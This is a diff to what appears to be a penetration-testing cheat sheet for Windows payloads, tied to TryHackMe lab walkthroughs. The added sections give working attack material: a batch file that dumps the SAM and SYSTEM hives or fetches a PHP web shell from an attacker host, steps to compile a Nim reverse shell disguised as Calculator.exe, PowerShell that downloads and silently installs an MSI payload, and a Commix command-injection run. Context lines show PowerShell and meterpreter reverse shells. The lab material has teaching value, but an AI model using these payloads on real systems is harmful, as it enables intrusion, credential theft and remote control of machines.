@@ -34,8 +34,6 @@ Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
 rlwrap nc -lvnp 4444
 ```
 
-
-
 ### EXE
 
 **Examples**
@@ -49,7 +47,103 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 python2 -m SimpleHTTPServer 81
 ```
 
+## BAT
 
+**Examples**
+
+[avenger.md](../walkthroughs/tryhackme/avenger.md "mention")
+
+Used when you can upload a file which will run afterwards.
+
+**exploit.bat**
+
+<pre><code><strong>@echo off
+</strong>
+:: Check if the current user is NT AUTHORITY\SYSTEM
+whoami /groups | find "S-1-5-18" > nul
+
+if %errorlevel% equ 0 (
+    :: Run commands for NT AUTHORITY\SYSTEM
+    reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
+    reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
+) else (
+    :: Run commands for other users
+    curl http://$KALI:82/shell.php -o C:\xampp\htdocs\shell.php
+)
+</code></pre>
+
+## **NIM**
+
+**Examples**
+
+[avenger.md](../walkthroughs/tryhackme/avenger.md "mention")
+
+**Kali**
+
+<pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
+cd Nim-Reverse-Shell/
+<strong>apt install mingw-w64 -y
+</strong></code></pre>
+
+**Kali**
+
+```
+curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+```
+
+**Kali**
+
+```
+subl rev_shell.nim
+```
+
+
+
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**&#x20;
+
+```
+/root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
+```
+
+## **MSI**
+
+**Examples**
+
+[cyberlens.md](../walkthroughs/tryhackme/cyberlens.md "mention")
+
+
+
+## **Commix**
+
+Can be used for web sites that are vulnerable to command injection.
+
+**Kali**
+
+```
+rlwrap nc -lvnp 1338
+```
+
+**Victim(powershell)**
+
+```
+cd C:\temp\shell.msi
+iwr -uri "http://$KALI:82/shell.msi" -o shell.msi
+msiexec /quiet /qn /i C:\temp\shell.msi
+```
+
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+git clone https://github.com/commixproject/commix.git commix
+cd commix/
+python commix.py -r ../request.txt 
+```
+
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## **PHP Reverse Shell**
 
